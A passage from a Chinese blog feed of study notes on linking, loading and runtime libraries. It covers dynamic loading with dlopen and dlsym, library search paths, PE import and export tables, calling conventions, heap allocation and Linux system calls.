title="重定位和初始化"></a>重定位和初始化</h3><p>当上面的步骤完成之后，链接器开始重新遍历可执行文件和每个共享对象的重定位表，将它们的GOT/PLT中的每个需要重定位的位置进行修正。</p><p>重定位完成之后，乳沟某个共享对象有”.init”段，那么动态链接器会执行”.init”段中的代码，用以实现共享对象特有的初始化过程。相应的，共享对象中还可能有”.finit”段，当进程退出时会指向”.finit”段中的代码，可以用来实现类似C++全局对象析构之类的操作。</p><h3 id="Linux动态链接器实现"><a href="#Linux动态链接器实现" class="headerlink" title="Linux动态链接器实现"></a>Linux动态链接器实现</h3><p>动态链接器本身是静态链接。</p><p>动态链接器可以是PIC也可以不是，但往往使用PIC会更加简单。</p><h2 id="显式运行时链接"><a href="#显式运行时链接" class="headerlink" title="显式运行时链接"></a>显式运行时链接</h2><p>显式运行时链接有时也叫运行时加载，即让程序自己再运行时控制加载指定的模块，并且可以在不需要该模块时将其卸载。</p><h3 id="动态装载库"><a href="#动态装载库" class="headerlink" title="动态装载库"></a>动态装载库</h3><p>共享对象不需要进行任何修改就可以进行运行时装载。</p><p>动态库的装载是通过一系列由动态链接器提供的API完成的，具体的讲共有4个函数：打开动态库(dlopen)、查找符号(dlsym)、错误处理(dlerror)、以及关闭动态库(dlclose)。</p><h3 id="dlopen"><a href="#dlopen" class="headerlink" title="dlopen()"></a>dlopen()</h3><p>dlopen()函数用来打开一个动态库，并将其加载到进程的地址空间，完成初始化过程，它的C原型定义为：</p><p>void * dlopen(const char *filename, int flag);</p><p>返回值为被加载模块的句柄；若加载模块失败，则返回NULL。若已经被加载过了，那么返回的是同一个句柄。</p><p>若模块间存在依赖关系，如A依赖于B，则应手工加载B，然后再加载A。</p><p>同时，加载模块时会执行模块中的”.init”段代码。</p><h4 id="filename"><a href="#filename" class="headerlink" title="filename"></a>filename</h4><p>第一个参数是被加载动态库的路径，如果是绝对路径（“/”开始的路径），则该函数将会尝试直接打开该动态库；如果是相对路径，那么会尝试在以一定的顺序去查找该动态库文件：</p><ol><li>查找由环境变量LD_LIBRARY_PATH指定的一系列目录。</li><li>查找由/etc/ld.so.cache里面所有指定的共享库路径。</li><li>/lib、/usr/lib  注意：这个查找顺序与旧的a.out装载器的顺序刚好相反，旧的a.out的装载器在装载共享库的时候会先查找/usr/lib，然后是/libc。</li></ol><p>若filename这个参数为0，则dlopen()返回的将是全局符号表的句柄。即可以在运行时找到全局符号表里面的任何一个符号，并且可以执行他们。全局符号表包括了程序的可执行文件本身、被动态链接器加载到进程中的所有共享模块以及在运行时通过dlopen打开并且使用了RTLD_GLOBAL方式的模块中的符号</p><h4 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h4><p>第二个参数flag表示函数符号的解析方式：</p><ol><li>RTLD_LAZY表示使用延迟绑定。</li><li>RTLD_NOW表示当模块被加载时即完成所有函数绑定的工作，如果有任何未定义的符号引用的绑定工作没法完成，那么dlopen()就返回错误（可用dlerror()立即捕获到相应的错误信息）。</li><li>RTLD_GLOBAL表示将被加载的模块的全局符号合并到进程的全局符号表中，使得以后加载模块可以使用这些符号。</li></ol><p>上面1、2两种绑定方式必选其一，第3种方式可以跟上面两者中任意一个一起使用。</p><h3 id="dlsym"><a href="#dlsym" class="headerlink" title="dlsym()"></a>dlsym()</h3><p>dlsym函数基本上是运行时装载的核心部分，我们可以通过这个函数找到所需要的符号。它的定义如下：</p><p>void * dlsym(void *handle, char *symbol);</p><p>第一个参数是由dlopen()返回的动态库的句柄；第二个参数即所要查找的符号的名字。</p><p>若找到了相应的符号，则返回该符号的值；若未查找到则返回NULL。</p><p>同时，若查找到符号，则dlerror()返回NULL；若未找到，dlerror()则返回相应的错误信息。</p><p>注：若查找的符号是函数，那么返回的是函数地址；若查找的符号是变量，则返回变量的地址；若查找的符号是常量，则返回常量的值。</p><h4 id="符号优先级-1"><a href="#符号优先级-1" class="headerlink" title="符号优先级"></a>符号优先级</h4><p>dlsym()对符号的查找优先级分两种类型。</p><ol><li>如果是在全局符号表中进行符号查找，即dlopen()时，参数filename为NULL，那么由于全局符号表使用的是装载序列，所以dlsym()使用的也是装载序列。</li><li>如果是对某个通过dlopen()打开的共享对象进行符号查找的话，那么采用的是依赖序列的优先级，即以被dlopen()打开的那个共享对象为根节点，对它所有依赖的共享对象进行广度优先遍历，直到找到符号为止。</li></ol><h3 id="dlerror"><a href="#dlerror" class="headerlink" title="dlerror()"></a>dlerror()</h3><p>每次调用dlopen()、dlsym()、dlclose()以后，都可以调用dlerror()函数来判读上一次抵用是否成功。返回值类型为char*。如果返回NULL，则表示上一次调用成功；如果不是，则返回相应的错误消息。</p><h3 id="dlclose"><a href="#dlclose" class="headerlink" title="dlclose()"></a>dlclose()</h3><p>dlclose()的作用是将一个已经加装的模块卸载。</p><p>系统会维持一个加装引用计算器，每次使用dlopen()加装某模块时，相应的计数器加一；每次使用dlclose()卸载某模块时，相应计数器减一，只有当计数器减到0时，模块才被真正地卸载掉。</p><p>卸载的过程先执行”.finit”段的代码，然后将相应的符号从符号表中去除，取消进程空间跟模块的映射关系，然后关闭模块文件。</p><h1 id="Linux共享库的组织"><a href="#Linux共享库的组织" class="headerlink" title="Linux共享库的组织"></a>Linux共享库的组织</h1><h2 id="共享库版本"><a href="#共享库版本" class="headerlink" title="共享库版本"></a>共享库版本</h2><h3 id="共享库兼容性"><a href="#共享库兼容性" class="headerlink" title="共享库兼容性"></a>共享库兼容性</h3><p>共享库的更新可分为两类：</p><ol><li>兼容性更新</li><li>不兼容性更新</li></ol><p>ABI：二进制接口</p><h3 id="共享库版本命名"><a href="#共享库版本命名" class="headerlink" title="共享库版本命名"></a>共享库版本命名</h3><p>libname.so.x.y.z</p><p>x表示主版本号，y表示次版本号，z表示发布版本号</p><h2 id="符号版本"><a href="#符号版本" class="headerlink" title="符号版本"></a>符号版本</h2><h5 id="次版本号交会问题"><a href="#次版本号交会问题" class="headerlink" title="次版本号交会问题"></a>次版本号交会问题</h5><h3 id="基于符号的版本机制"><a href="#基于符号的版本机制" class="headerlink" title="基于符号的版本机制"></a>基于符号的版本机制</h3><h2 id="共享库系统路径"><a href="#共享库系统路径" class="headerlink" title="共享库系统路径"></a>共享库系统路径</h2><h3 id="FHS标准"><a href="#FHS标准" class="headerlink" title="FHS标准"></a>FHS标准</h3><p>该标准规定了一个系统中的系统文件应该如何存放，包括各个目录的结构、组织和作用。</p><p>/lib：这个位置主要存放系统最关键和基础的共享库，如动态链接库、C语言运行库、数学库等，主要是那些/bin和/sbin下的程序所需要用到的库，还有系统启动时需要的库</p><p>/usr/lib：这个目录下主要保存的是一些非系统运行时所需要的关键性的共享库，主要是一些开发时用到的库，同时还包含了开发时可能会用到的静态库、目标文件等。</p><p>/usr/local/lib：这个目录用来放置一些跟操作系统本身并不十分相关的库，主要是一些第三方的应用程序的库。</p><h2 id="共享库查找过程"><a href="#共享库查找过程" class="headerlink" title="共享库查找过程"></a>共享库查找过程</h2><h2 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h2><h3 id="LD-LIBRARY-PATH"><a href="#LD-LIBRARY-PATH" class="headerlink" title="LD_LIBRARY_PATH"></a>LD_LIBRARY_PATH</h3><p>用于指定动态库目录</p><h3 id="lib-ld-linux-so-2-library-path-home-user-bin-ls"><a href="#lib-ld-linux-so-2-library-path-home-user-bin-ls" class="headerlink" title="/lib/ld-linux.so.2 -library-path /home/user /bin/ls"></a>/lib/ld-linux.so.2 -library-path /home/user /bin/ls</h3><p>用动态链接器指定动态库目录启动ls</p><h3 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h3><p>指定预先装载的一些动态库或是目标文件</p><h3 id="etc-ld-so-preload"><a href="#etc-ld-so-preload" class="headerlink" title="/etc/ld.so.preload"></a>/etc/ld.so.preload</h3><p>其中配置作用跟LD_PRELOAD相同</p><h3 id="LD-DEBUG"><a href="#LD-DEBUG" class="headerlink" title="LD_DEBUG"></a>LD_DEBUG</h3><p>有几种值：</p><p>files：打印整个装载过程</p><p>bindings：显示动态链接的符号绑定过程</p><p>libs：显示共享库的查找过程</p><p>versions：显示符号版本依赖关系</p><p>reloc：显示重定位过程</p><p>symbols：显示符号查找过程</p><p>statistics：显示动态链接过程中的各种统计信息</p><p>all：显示以上所有信息</p><p>help：显示上面的各种可选值的帮助信息</p><p>用法：LD_DEBUG=files ./helloworld.out</p><h2 id="共享库的创建与安装"><a href="#共享库的创建与安装" class="headerlink" title="共享库的创建与安装"></a>共享库的创建与安装</h2><h1 id="Windows下的动态链接"><a href="#Windows下的动态链接" class="headerlink" title="Windows下的动态链接"></a>Windows下的动态链接</h1><h2 id="DLL简介"><a href="#DLL简介" class="headerlink" title="DLL简介"></a>DLL简介</h2><h3 id="进程地址空间和内存空间"><a href="#进程地址空间和内存空间" class="headerlink" title="进程地址空间和内存空间"></a>进程地址空间和内存空间</h3><h3 id="基地址和RVA"><a href="#基地址和RVA" class="headerlink" title="基地址和RVA"></a>基地址和RVA</h3><h3 id="DLL共享数据段"><a href="#DLL共享数据段" class="headerlink" title="DLL共享数据段"></a>DLL共享数据段</h3><p>Windows允许将DLL的数据段设置成共享的，即任何进程都可以共享该DLL的同一份数据段。</p><h3 id="DLL显示运行时链接"><a href="#DLL显示运行时链接" class="headerlink" title="DLL显示运行时链接"></a>DLL显示运行时链接</h3><p>Windows提供了3个API为：</p><p>LoadLibrary（或者LoadLibraryEx），这个函数用来装载一个DLL到进程的地址空间，它的功能跟dlopen类似。</p><p>GetProcAddress，用来查找某个符号的地址，与dlsym类似。</p><p>FreeLibrary，用来卸载某个已加载的模块，与dlclose类似。</p><h2 id="符号导出导入表"><a href="#符号导出导入表" class="headerlink" title="符号导出导入表"></a>符号导出导入表</h2><h3 id="导出表"><a href="#导出表" class="headerlink" title="导出表"></a>导出表</h3><p>当一个PE需要将一些函数或变量提供给其他PE文件使用时，我们把这种行为叫做符号导出。</p><p>所有导出的符号被集中存放在了北滘镇导出表的结构中。</p><p>DataDirectory的结构数组中第一个元素就是导出表的结构的地址和长度。</p><p>导出表结构中，最后的3个成员指向的是3个数组，这3个数组是导出表中最重要的结构，他们是导出地址表（存放的是各个导出函数的RVA）、符号名表（保存的是导出函数的名字）和名字序号对应表。</p><h4 id="序号"><a href="#序号" class="headerlink" title="序号"></a>序号</h4><p>一个导出函数的序号就是函数在EAT中的地址下标加上一个Base值（也就是IMAGE_EXPORT_DIRECTORY中的Base，默认情况下它的值是1）。</p><h3 id="EXP文件"><a href="#EXP文件" class="headerlink" title="EXP文件"></a>EXP文件</h3><p>链接器在创建DLL时与静态链接时一样采用两遍扫描过程，DLL一般都有导出符号，链接器在第一遍时会遍历所有目标文件并且收集所有导出符号信息并且创建DLL的导出表。链接器把这个导出表放到一个临时的目标文件叫做”.edata”的段中，这个目标文件就是EXP文件。EXP文件是一个标准的PE/COFF目标文件。</p><p>在第二遍时，链接器就把这个EXP文件当做普通的目标文件一样，与其他输入的目标文件链接在一起并且输出DLL。这个时候EXP文件中的”.edata”段也就会被输出到DLL文件中并且成为导出表。一般情况下把”.edata”段合并到只读数据段”,rdata”中。</p><h3 id="导出重定向"><a href="#导出重定向" class="headerlink" title="导出重定向"></a>导出重定向</h3><p>即将某个导出符号重定向到另外一个DLL。</p><h3 id="导入表"><a href="#导入表" class="headerlink" title="导入表"></a>导入表</h3><p>如果我们再某个程序中使用到了来自DLL的函数或者变量，那么我们就把这种行为叫做符号导入。</p><p>在PE文件中，导入表是一个IMAGE_IMPORT_DESCRIPTOR的结构体数组，每个一个结构对应一个被导入的DLL。</p><p>结构体重最后一项FirstThunk指向一个导入地址数组(IAT)，IAT是导入表中最重要的结构，IAT中每个元素对应一个被导入的符号，元素的值在不同的情况下有不同的含义：</p><ul><li>在动态链接器刚完成映射还没开始重定位和符号解析时，IAT中的元素值表示相对应的导入符号的序号或者是符号名。</li><li>当Windows的动态链接器在完成该模块的链接时，元素值会被动态链接器改写成该符号的真正地址。</li><li>对于32位的PE来说，如果改元素最高位被置1，那么低31位值就是导入符号的序号值；如果没有那么元素的值是指向一个叫做IMAGE_IMPORT_BY_NAME结构的RVA。</li></ul><p>结构体第一项还有一个指针OriginalFirstThrunk，它指向一个数组叫做导入名称表（INT），这个数组与IAT一模一样，里面的数值也一样。</p><h4 id="延迟载入"><a href="#延迟载入" class="headerlink" title="延迟载入"></a>延迟载入</h4><h3 id="导入函数的调用"><a href="#导入函数的调用" class="headerlink" title="导入函数的调用"></a>导入函数的调用</h3><h2 id="DLL优化"><a href="#DLL优化" class="headerlink" title="DLL优化"></a>DLL优化</h2><h3 id="重定基地址"><a href="#重定基地址" class="headerlink" title="重定基地址"></a>重定基地址</h3><p>Windows PE采用了装载时重定位的方法。在DLL模块装载时，如果目标地址被占用，那么操作系统就会为它分配一块新的空间，并且将DLL装载到该地址。</p><p>重定位过程中，涉及到绝对地址的引用都进行重定位，所有这些需要重定位的地方只需要加上一个固定的差值。</p><p>事实上由于DLL内部的地址都是基于基地址，或者是相对于基地址的RVA、那么所有需要重定位的地方都只需要加上一个固定的差值。PE里面把这种特殊的重定位过程又叫做重定基地址。</p><h3 id="序号-1"><a href="#序号-1" class="headerlink" title="序号"></a>序号</h3><p>一个DLL中每一个导出函数都有一个对应的序号。</p><h3 id="导入函数绑定"><a href="#导入函数绑定" class="headerlink" title="导入函数绑定"></a>导入函数绑定</h3><h4 id="DLL绑定的实现"><a href="#DLL绑定的实现" class="headerlink" title="DLL绑定的实现"></a>DLL绑定的实现</h4><p>editbin对绑定的程序的导入符号进行遍历查找，找到以后就把符号的运行时的目标地址写入到被绑定程序的导入表内（INT）。</p><h4 id="绑定地址失效"><a href="#绑定地址失效" class="headerlink" title="绑定地址失效"></a>绑定地址失效</h4><p>一种情况是被依赖的DLL更新导致DLL的导出函数地址发生变化；另外一种情况是被依赖的DLL在装载时发生重定基址，导致DLL的装载地址与被绑定时不一致。</p><h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><p>对于第一种情况，当堆程序进行绑定时，对每个导入的DLL，链接器把DLL的时间戳和校验和保存到被绑定的PE文件的导入表中。在运行时，Windows会核对将要被装载的DLL与绑定时的DLL版本是否相同，并且确认该DLL没有发生重定基址，如果一切正常，那么Windows就不需要再进行符号解析过程了；否则Windows就忽略绑定的符号地址，按照正常的符号解析过程对DLL的符号进行解析。</p><h2 id="C-与动态链接"><a href="#C-与动态链接" class="headerlink" title="C++与动态链接"></a>C++与动态链接</h2><h4 id="组件对象模块"><a href="#组件对象模块" class="headerlink" title="组件对象模块"></a>组件对象模块</h4><p>《COM本质论》</p><h2 id="DLL-HELL"><a href="#DLL-HELL" class="headerlink" title="DLL HELL"></a>DLL HELL</h2><h4 id="解决DLL-HELL的方法"><a href="#解决DLL-HELL的方法" class="headerlink" title="解决DLL HELL的方法"></a>解决DLL HELL的方法</h4><ul><li><p>静态链接</p></li><li><p>防止DLL覆盖</p></li><li><p>避免DLL冲突</p></li><li><p>.NET下DLL HELL的解决方案</p></li></ul><h1 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h1><h2 id="程序的内存布局"><a href="#程序的内存布局" class="headerlink" title="程序的内存布局"></a>程序的内存布局</h2><h2 id="栈与调用惯例"><a href="#栈与调用惯例" class="headerlink" title="栈与调用惯例"></a>栈与调用惯例</h2><h3 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h3><p>栈保存了一个函数调用所需要的维护信息，这常常被称为堆栈帧或活动记录，一般包括如下几方面内容：</p><ul><li>函数的返回地址和参数</li><li>临时变量：包括函数的非晶体局部变量以及编译器自动生成的其他临时变量。</li><li>保存的上下文：包括在函数调用前后需要保持不变的寄存器。</li></ul><p>一个i386下的函数总是这样调用的：</p><ol><li>把所有或一部分参数压入栈中，如果有其他参数没用入栈，那么使用某些特定的寄存器传递。</li><li>把当前指令的下一条指令的地址压入栈中。</li><li>跳转到函数体执行。</li></ol><p>而i386函数体的“标准”开头是这样的：</p><ul><li>push ebp;</li><li>mov ebp,esp;</li><li>[可选]sub ebp,xxx;</li><li>[可选]push xxx;</li></ul><p>“标准”结尾：</p><ul><li>[可选]pop xxx;</li><li>mov esp,ebp;</li><li>pop ebp;</li><li>ret;</li></ul><h3 id="调用惯例"><a href="#调用惯例" class="headerlink" title="调用惯例"></a>调用惯例</h3><p>一个调用惯例一般会规定如下几个方面的内容：</p><ul><li>函数参数的传递顺序和方式</li><li>栈的维护方式</li><li>名字修饰的策略</li></ul><table><thead><tr><th align="center">调用惯例</th><th align="center">出栈方</th><th align="center">参数传递</th><th align="center">名字修饰</th></tr></thead><tbody><tr><td align="center">cdecl</td><td align="center">函数调用方</td><td align="center">从右至左的顺序压参数入栈【如fun(a,b),先压b再压a】</td><td align="center">下划线+函数名</td></tr><tr><td align="center">stdcall</td><td align="center">函数本身</td><td align="center">从右至左的顺序压参数入栈</td><td align="center">下划线+函数名+@+参数的字节数，如函数int func(int a,double b)的修饰名是_func@12</td></tr><tr><td align="center">fastcall</td><td align="center">函数本身</td><td align="center">头两个DWORD(4字节)类型或者占更少字节的参数被放入寄存器，其他剩下的参数按从右到左的顺序压入栈</td><td align="center">@+函数名+@+参数的字节数</td></tr><tr><td align="center">pascal</td><td align="center">函数本身</td><td align="center">从左至右的顺序压参数入栈</td><td align="center">较为复杂，参见pascal文档</td></tr></tbody></table><h3 id="函数返回值的传递"><a href="#函数返回值的传递" class="headerlink" title="函数返回值的传递"></a>函数返回值的传递</h3><p>4字节以内：存放在eax</p><p>5—8字节：低4字节存放在eax，高1—4字节存放在edx</p><p>大于8字节：在栈上额外开辟空间，将返回值传入，并将该地址指针传给eax，返回后，调用方将eax指向的地址的值拷贝出来。</p><h3 id="堆和内存管理"><a href="#堆和内存管理" class="headerlink" title="堆和内存管理"></a>堆和内存管理</h3><h3 id="Linux进程堆管理"><a href="#Linux进程堆管理" class="headerlink" title="Linux进程堆管理"></a>Linux进程堆管理</h3><h3 id="Windows进程堆管理"><a href="#Windows进程堆管理" class="headerlink" title="Windows进程堆管理"></a>Windows进程堆管理</h3><h4 id="堆管理器"><a href="#堆管理器" class="headerlink" title="堆管理器"></a>堆管理器</h4><h3 id="堆分配算法"><a href="#堆分配算法" class="headerlink" title="堆分配算法"></a>堆分配算法</h3><h4 id="空闲链表"><a href="#空闲链表" class="headerlink" title="空闲链表"></a>空闲链表</h4><p>将堆中各个空闲的块按照链表的方式连接起来，当用户请求一块空间时，可以遍历整个列表，直到找到合适大小的块并且将它拆分；当用户释放空间时将它合并到空闲链表中。</p><h4 id="位图"><a href="#位图" class="headerlink" title="位图"></a>位图</h4><p>其核心思想是将整个堆划分为大量的块，每个块的大小相同。当用户请求内存的时候，总是分配整数个块的空间给用户，第一个块我们称为已分配区域的头，其余的称为已分配区域的主体。而我们可以使用一个整数数组来记录块的使用情况，由于每个块只有头/主体/空闲三种状态，因此仅仅需要两位即可表示一个块，因此称为位图。</p><h4 id="对象池"><a href="#对象池" class="headerlink" title="对象池"></a>对象池</h4><p>当被分配对象的大小是较为固定的几个值，这时候我们可以针对这样的特征设计一个更为高效的堆算法，称为对象池。</p><p>对象池的思路：如果每一次分配的空间大小都一样，那么就可以按照这个每次请求分配的大小作为一个单位，，把整个堆空间划分为大量的小块，每次请求的时候只需要找到一个小块就可以了。</p><p>对象池的管理方法可以采用空闲链表，也可以采用位图，与它们的区别仅仅在于它假设了每次请求的都是一个固定的大小。</p><h1 id="运行库"><a href="#运行库" class="headerlink" title="运行库"></a>运行库</h1><h2 id="入口函数和程序的初始化"><a href="#入口函数和程序的初始化" class="headerlink" title="入口函数和程序的初始化"></a>入口函数和程序的初始化</h2><p>一个典型的程序运行步骤大致如下：</p><ul><li>操作系统在创建进程后，把控制权交到了程序的入口，这个入口往往是运行库中的某个入口函数。</li><li>入口函数对运行库和程序运行环境进行初始化，包括堆、I/O、线程、全局变量构造，等等。</li><li>入口函数在完成初始化之后，调用main函数，正式开始执行程序主体部分。</li><li>main函数执行完毕以后，返回到入口函数，入口函数进行清理工作，包括全局变量析构、堆销毁，关闭I/O等，然后进行系统调用结束进程。</li></ul><h3 id="入口函数的实现"><a href="#入口函数的实现" class="headerlink" title="入口函数的实现"></a>入口函数的实现</h3><h4 id="GLIBC入口函数"><a href="#GLIBC入口函数" class="headerlink" title="GLIBC入口函数"></a>GLIBC入口函数</h4><h5 id="静态glibc"><a href="#静态glibc" class="headerlink" title="静态glibc"></a>静态glibc</h5><h4 id="MSVC-CRT-入口函数"><a href="#MSVC-CRT-入口函数" class="headerlink" title="MSVC CRT 入口函数"></a>MSVC CRT 入口函数</h4><p>入口函数mainCRTStartup的总体流程：</p><ol><li>初始化和OS版本有关的全局变量</li><li>初始化堆</li><li>初始化I/O</li><li>获取命令行参数和环境变量</li><li>初始化C库的一些数据</li><li>调用main并记录返回值</li><li>检查错误并将main的返回值返回</li></ol><h3 id="运行库与I-O"><a href="#运行库与I-O" class="headerlink" title="运行库与I/O"></a>运行库与I/O</h3><p>在Linux中，值为0、1、2的fd分布代码标准输入、标准输出和标准错误输出。</p><h4 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h4><p>在内核中，每一个进程都有一个私有的“打开文件表”，这个表是一个指针数组，每一个元素都指向一个内核的打开文件对象，而fd就是这个表的下标。</p><p>stdin、stdout、stderr均是FILE结构的指针。</p><h4 id="句柄"><a href="#句柄" class="headerlink" title="句柄"></a>句柄</h4><p>对于Windows中的句柄，与Linux中的fd大同小异，不过Windows的句柄是其下标经过某种线性变换之后的结果。</p><h4 id="I-O初始化"><a href="#I-O初始化" class="headerlink" title="I/O初始化"></a>I/O初始化</h4><p>首先I/O初始化函数需要在用户空间中建立stdin、stdout、stderr及其对应的FILE结构，使得程序进入main之后可以直接使用printf、scanf等函数。</p><h3 id="MSVC-CRT的入口函数初始化"><a href="#MSVC-CRT的入口函数初始化" class="headerlink" title="MSVC CRT的入口函数初始化"></a>MSVC CRT的入口函数初始化</h3><p>MSVC的入口函数初始化主要包含两部分，堆初始化和I/O初始化。</p><h4 id="系统堆初始化"><a href="#系统堆初始化" class="headerlink" title="系统堆初始化"></a>系统堆初始化</h4><p>主要由函数_heap_int完成。</p><h4 id="I-O初始化-1"><a href="#I-O初始化-1" class="headerlink" title="I/O初始化"></a>I/O初始化</h4><p>MSVC的I/O初始化就是要构造一个二维的打开文件表。由_ioinit函数完成。主要完成如下几个工作：</p><ol><li>建立打开文件表。</li><li>如果能够继承自父进程，那么从父进程获取继承的句柄。</li><li>初始化标准输入输出。</li></ol><h2 id="C-C-运行库"><a href="#C-C-运行库" class="headerlink" title="C/C++运行库"></a>C/C++运行库</h2><h3 id="C语言运行库"><a href="#C语言运行库" class="headerlink" title="C语言运行库"></a>C语言运行库</h3><p>一个C语言运行库大致包含如下功能：</p><ul><li>启动与退出：包括入口函数及入口函数所依赖的其他函数等。</li><li>标准函数：由C语言标准规定的C语言标准库所拥有的函数实现。</li><li>I/O：I/O功能的封装和实现。</li><li>堆：堆的封装和实现。</li><li>语言实现：语言中一些特殊功能的实现。</li><li>调试：实现调试功能的代码。</li></ul><h3 id="C语言标准库"><a href="#C语言标准库" class="headerlink" title="C语言标准库"></a>C语言标准库</h3><p>C语言标准库一般包含：</p><ul><li>标准输入输出（stdio.h）</li><li>文件操作（stdio.h）</li><li>字符操作（ctype.h）</li><li>字符串操作（string.h）</li><li>数学函数（math.h）</li><li>资源管理（stdlib.h）</li><li>格式转化（stdlib.h）</li><li>时间/日期（time.h）</li><li>断言（assert.h）</li><li>各种类型上的常数（limits.h&amp;float.h)</li><li>变长参数（stdarg.h）</li><li>非局部跳转（setjmp.h）</li></ul><h4 id="变长参数"><a href="#变长参数" class="headerlink" title="变长参数"></a>变长参数</h4><p>如print即使用变长参数。</p><h4 id="非局部跳转"><a href="#非局部跳转" class="headerlink" title="非局部跳转"></a>非局部跳转</h4><p>使用非局部跳转，可以实现从一个函数体内向另一个事先登记过的函数体内跳转，而不用担心堆栈混乱。</p><p>setjmp与longjmp函数</p><h3 id="glibc与MSVC-CRT"><a href="#glibc与MSVC-CRT" class="headerlink" title="glibc与MSVC CRT"></a>glibc与MSVC CRT</h3><h2 id="运行库与多线程"><a href="#运行库与多线程" class="headerlink" title="运行库与多线程"></a>运行库与多线程</h2><h3 id="CRT的多线程困扰"><a href="#CRT的多线程困扰" class="headerlink" title="CRT的多线程困扰"></a>CRT的多线程困扰</h3><h4 id="线程的访问权限"><a href="#线程的访问权限" class="headerlink" title="线程的访问权限"></a>线程的访问权限</h4><p>实际运用中线程拥有自己的私有存储空间：</p><ul><li>栈（尽管并非完全无法被其他线程访问）</li><li>线程局部存储（TLS）。线程局部存储是某些操作系统为线程单独提供的私有空间，但通常只具有很有限的尺寸。</li><li>寄存器（包括PC寄存器），寄存器是执行流的基本数据，因此为线程私有。</li></ul><h2 id="fread实现"><a href="#fread实现" class="headerlink" title="fread实现"></a>fread实现</h2><h3 id="缓冲"><a href="#缓冲" class="headerlink" title="缓冲"></a>缓冲</h3><h1 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h1><h2 id="系统调用介绍"><a href="#系统调用介绍" class="headerlink" title="系统调用介绍"></a>系统调用介绍</h2><h3 id="Linux系统调用"><a href="#Linux系统调用" class="headerlink" title="Linux系统调用"></a>Linux系统调用</h3><p>在x86下同下，系统调用由0x80中断完成，eax寄存器用于表示系统调用的接口号（比如1表示退出进程，2表示创建进程，3表示读取文件或IO，4表示写文件或IO）</p><h2 id="系统调用原理"><a href="#系统调用原理" class="headerlink" title="系统调用原理"></a>系统调用原理</h2><h3 id="特权级与中断"><a href="#特权级与中断" class="headerlink" title="特权级与中断"></a>特权级与中断</h3><p>在现代操作系统中，通常具有两种特权级别，分别为用户模式和内核模式，也被称为用户态和内核态。</p><p>系统调用是运行在内核态的，而应用程序基本都是运行在用户态的。</p><p>操作系统通过中断来从用户态切换到内核态。</p><h4 id="中断"><a href="#中断" class="headerlink" title="中断"></a>中断</h4><p>中断是一个硬件或软件发出的请求，要求CPU暂停当前的工作转手去处理更加重要的事情。</p><p>中断一般具有两种属性，一个称为中断号（从0开始），一个称为中断处理程序。</p><p>不同的中断具有不同的中断号，而一个中断处理程序对应一个中断号。</p><p>在内核中，有个数组称为中断向量表，这个数组的第n向包含了指向第n号中断的中断的中断处理程序的指针。</p><p>当中断到来时，CPU会暂停当前执行的代码，根据中断的中断号，在中断向量表中找到对应的中断处理程序，并调用它。中断处理程序执行完成之后，CPU会继续执行之前的代码。</p><h4 id="系统调用-1"><a href="#系统调用-1" class="headerlink" title="系统调用"></a>系统调用</h4><p>和中断一样，系统调用都有一个系统调用号，这个系统调用号通常就是系统调用在系统调用表中的位置。</p><h3 id="基于int的Linux的经典系统调用实现"><a href="#基于int的Linux的经典系统调用实现" class="headerlink" title="基于int的Linux的经典系统调用实现"></a>基于int的Linux的经典系统调用实现</h3><p>以fork为例的Linux系统调用：</p><ol><li>触发中断</li><li>切换堆栈<ol><li>保存当前ESP、SS的值</li><li>将ESP、SS的值设置为内核栈的相应值。</li></ol></li><li>中断处理程序</li></ol><h3 id="Linux的新型系统调用机制"><a href="#Linux的新型系统调用机制" class="headerlink" title="Linux的新型系统调用机制"></a>Linux的新型系统调用机制</h3><p>Linux在2.5版本起开始支持一种新型的系统调用机制。</p><p>linux-gate.so.1是操作系统生成的一个虚拟动态库（VDSO），这个库总是被加载在地址0xffffe000的位置上。(32位)</p><h2 id="Windows-API"><a href="#Windows-API" class="headerlink" title="Windows API"></a>Windows API</h2><p>Windows API是指Windows操作系统提供给应用程序开发者的最底层、最直接与Windows打交道的接口。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;编译与链接&quot;&gt;&lt;a href=&quot;#编译与链接&quot; class=&quot;headerlink&quot; title=&quot;编译与链接&quot;&gt;&lt;/a&gt;编译与链接&lt;/h1&gt;&lt;h2 id=&quot;预处理&quot;&gt;&lt;a href=&quot;#预处理&quot; class=&quot;headerlink&quot; title=&quot;预处理&quot;&gt;&lt;/
      
    
    </summary>
    
    
      <category term="笔记" scheme="https://nuoye-blog.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="笔记" scheme="https://nuoye-blog.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
      <category term="linux" scheme="https://nuoye-blog.github.io/tags/linux/"/>
    
      <category term="编译" scheme="https://nuoye-blog.github.io/tags/%E7%BC%96%E8%AF%91/"/>
    
      <category term="链接" scheme="https://nuoye-blog.github.io/tags/%E9%93%BE%E6%8E%A5/"/>
    
      <category term="装载" scheme="https://nuoye-blog.github.io/tags/%E8%A3%85%E8%BD%BD/"/>
    
      <category term="动态装载" scheme="https://nuoye-blog.github.io/tags/%E5%8A%A8%E6%80%81%E8%A3%85%E8%BD%BD/"/>
    
  </entry>
  
  <entry>
    <title>《Linux内核设计与实现》</title>
    <link href="https://nuoye-blog.github.io/2020/05/09/%E7%AC%94%E8%AE%B0/Linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/Linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/"/>
    <id>https://nuoye-blog.github.io/2020/05/09/%E7%AC%94%E8%AE%B0/Linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/Linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/</id>
    <published>2020-05-08T16:00:00.000Z</published>
